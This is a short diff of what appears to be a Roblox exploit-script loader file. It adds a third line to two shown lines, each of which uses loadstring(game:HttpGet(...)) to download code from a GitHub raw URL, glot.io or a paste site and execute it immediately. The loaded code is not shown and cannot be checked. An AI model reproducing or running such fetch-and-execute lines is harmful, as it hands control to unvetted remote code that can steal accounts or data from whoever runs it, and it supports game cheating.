@@ -6,3 +6,4 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Sh
 
 loadstring(game:HttpGet("https://glot.io/snippets/h3n1t3tj5i/raw/main.lua"))()
 
+loadstring(game:HttpGet("https://paste.myst.rs/raw/y1gh2ys9/qtopv7u9"))()
